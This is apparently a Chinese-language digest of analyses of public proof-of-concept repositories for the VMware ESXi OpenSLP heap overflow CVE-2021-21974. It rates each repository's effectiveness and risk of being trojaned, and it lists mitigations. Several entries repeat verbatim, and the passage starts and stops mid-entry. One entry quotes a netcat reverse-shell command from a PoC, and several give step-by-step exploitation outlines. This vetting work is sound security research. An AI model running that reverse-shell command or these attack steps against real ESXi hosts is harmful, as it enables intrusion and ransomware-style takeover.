1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，利用 OpenSLP 服务的堆溢出漏洞。
4.  通过精心设计的溢出数据，攻击者可以在目标系统上执行任意代码，从而完全控制 ESXi 服务器。

**项目地址:** [hateme021202/cve-2021-21974](https://github.com/hateme021202/cve-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #5

**来源**: [CVE-2021-21974-mercylessghost_CVE-2021-21974.md](../2021/CVE-2021-21974-mercylessghost_CVE-2021-21974.md)

## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #6

**来源**: [CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md](../2021/CVE-2021-21974-n2x4_Feb2023-CVE-2021-21974-OSINT.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并且能够访问427端口。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过向 ESXi 主机的 427 端口发送特制的 SLP 请求，触发 OpenSLP 服务的堆溢出，最终实现远程代码执行。

**有效性：**
从搜索结果来看，该漏洞已被广泛研究，并且存在公开的PoC。诸多安全厂商的报告显示，该漏洞被ESXiArgs 勒索软件利用，影响较大。Rapid7 等机构确认存在大量未修补的 ESXi 服务器，证明漏洞的利用是有效的。

**投毒风险：**
提供的“漏洞利用代码”实为一个名为`ESXResults.csv`的CSV文件，其中包含大量Bitcoin地址和对应的比特币数量以及一个TOXID。该文件很可能并非真正的漏洞利用代码，而是一个被伪装成PoC的恶意文件，目的是收集潜在受害者的信息（例如，关联受感染服务器和特定比特币地址），或者用于其他恶意目的，例如钓鱼攻击。因此，该文件存在极高的投毒风险。

**利用方式：**
根据漏洞信息，利用方式为：
1.  攻击者与目标 ESXi 主机处于同一网络段。
2.  攻击者能够访问 ESXi 主机的 427 端口（OpenSLP 服务端口）。
3.  攻击者构造恶意的 SLP 请求，发送到 ESXi 主机的 427 端口。
4.  OpenSLP 服务处理恶意请求时，发生堆溢出。
5.  攻击者利用堆溢出，执行任意代码，控制 ESXi 主机。

尽管实际的漏洞利用代码未提供，但从漏洞描述和搜索结果可以推断，该漏洞利用的重点在于构造特定的 SLP 请求，以触发 OpenSLP 服务的堆溢出。目前已经有公开的PoC，可用于生成有效的攻击载荷。

**项目地址:** [n2x4/Feb2023-CVE-2021-21974-OSINT](https://github.com/n2x4/Feb2023-CVE-2021-21974-OSINT)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---



---

## POC #2

**来源**: [CVE-2021-21974-Shadow0ps_CVE-2021-21974.md](../2021/CVE-2021-21974-Shadow0ps_CVE-2021-21974.md)

## CVE-2021-21974 VMware ESXi OpenSLP 堆溢出漏洞

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974 是 VMware ESXi 中 OpenSLP 服务中的一个堆溢出漏洞。攻击者通过向目标 427 端口发送特制的 SLP 数据包，利用 OpenSLP 服务处理数据包时存在的缺陷触发堆溢出，进而实现远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞的POC代码是有效的。漏洞库信息明确指出了该漏洞的存在，并说明了攻击条件和影响。搜索引擎结果显示该漏洞已被广泛研究，并且存在公开的利用代码。提供的POC代码实现了发送恶意 SLP 数据包的功能，可以触发目标 ESXi 服务器的堆溢出漏洞。

**投毒风险评估：**
POC 代码存在一定程度的投毒风险，约为 10%。主要依据是POC 代码中存在可自定义的 `shell_cmd` 变量，该变量允许攻击者执行任意命令。虽然默认的 `shell_cmd` 是反弹 shell， 但攻击者可以将 `shell_cmd` 修改为恶意命令，例如删除文件、篡改配置或植入后门。此外，POC代码本身较为复杂，攻击者可以加入混淆，利用各种编码绕过检测。

**利用方式分析：**
1.  **漏洞定位：**  漏洞存在于 ESXi 的 OpenSLP 服务中，该服务监听在 427 端口。
2.  **攻击条件：**  攻击者需要与 ESXi 服务器位于同一网络段，并且可以访问 427 端口。
3.  **攻击步骤：**
    *   攻击者使用POC代码，构造恶意的 SLP 数据包。SLP数据包的目的在于触发目标主机的堆溢出
    *   通过`shell_cmd`配置，向 ESXi 服务器的 427 端口发送该数据包，触发 OpenSLP 服务中的堆溢出漏洞。
    *   利用堆溢出漏洞，攻击者可以在 ESXi 服务器上执行任意代码。
    *   执行的代码默认配置为反弹 shell。攻击者可以建立与 ESXi 服务器的连接，从而控制 ESXi 服务器。
4.  **缓解措施：**
    *   及时更新 ESXi 服务器到最新版本，修补该漏洞。
    *   限制对 ESXi 服务器 427 端口的访问，只允许受信任的网络段访问该端口。
    *   禁用 OpenSLP 服务，如果不需要该服务的话。

**项目地址:** [Shadow0ps/CVE-2021-21974](https://github.com/Shadow0ps/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #3

**来源**: [CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md](../2021/CVE-2021-21974-abirasecurity_CVE-2021-21974_vuln_dectection.md)

## CVE-2021-21974-VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需与 ESXi 处于同一网络段，并能访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者通过发送特制的 SLP 数据包到 ESXi 服务器的 427 端口，可以触发 OpenSLP 服务的堆溢出，从而实现远程代码执行。 

**有效性评估：**
提供的POC代码是一个漏洞检测工具，而非直接的利用代码。它通过发送不同长度的 URL 和 Scope 字段到目标机器的427端口，并检测响应时间来判断目标是否存在漏洞。通过发送`DAAdvert`类型的SLP包，改变`url_len`和`scope_len`测试边界条件，这种方式相对安全，不会直接触发溢出，只是通过分析响应时间来判断。

**投毒风险评估：**
提供的代码主要用于检测漏洞是否存在，而不是利用漏洞。它没有包含任何恶意代码，用于在目标系统上执行恶意操作。因此，投毒风险评估为 0%。

**利用方式分析：**
1.  **漏洞触发：** 攻击者向 ESXi 服务器的 427 端口发送恶意的 SLP DAAdvert 请求。该请求中包含精心构造的 URL 和 Scope 字段，其长度超出 OpenSLP 服务预期的缓冲区大小。
2.  **堆溢出：** 当 OpenSLP 服务处理该请求时，由于长度验证不足或错误，导致数据写入超出缓冲区边界，覆盖相邻的内存区域，从而造成堆溢出。
3.  **代码执行：** 攻击者可以通过控制溢出内容，覆盖函数指针或其他关键数据，当程序执行到被覆盖的函数指针时，将跳转到攻击者预先布置的恶意代码，从而实现远程代码执行。

**项目地址:** [abirasecurity/CVE-2021-21974_vuln_dectection](https://github.com/abirasecurity/CVE-2021-21974_vuln_dectection)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)

---

## POC #4

**来源**: [CVE-2021-21974-hateme021202_cve-2021-21974.md](../2021/CVE-2021-21974-hateme021202_cve-2021-21974.md)

## CVE-2021-21974 - VMware ESXi OpenSLP 堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG, VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 与 ESXi 位于同一网络段，且能够访问 427 端口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-21974 存在于 VMware ESXi 的 OpenSLP 服务中，是一个堆溢出漏洞。攻击者如果与目标 ESXi 服务器位于同一网络分段，并且能够访问其 427 端口，就可以利用此漏洞在 OpenSLP 服务中触发堆溢出，最终实现远程代码执行。

**有效性：**
根据搜索结果可知，该漏洞已被广泛利用，甚至被用于 ESXiArgs 勒索软件攻击。提供的 Nmap 脚本 `vmware-svrloc-vulns.nse` 用于检测目标 ESXi 服务器是否存在该漏洞，通过版本和构建号判断是否已修补，证明POC的有效性。

**投毒风险：**
提供的 Nmap 脚本主要功能是版本检测和漏洞验证。脚本通过发送 SLP 请求，然后根据返回的版本号和构建号判断是否存在漏洞。代码本身没有发现任何恶意行为，例如执行系统命令、上传文件或建立后门连接等。所以投毒风险较低。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者需要与目标 ESXi 服务器位于同一网络分段。
2.  攻击者需要能够访问目标 ESXi 服务器的 427 端口（OpenSLP 服务端口）。
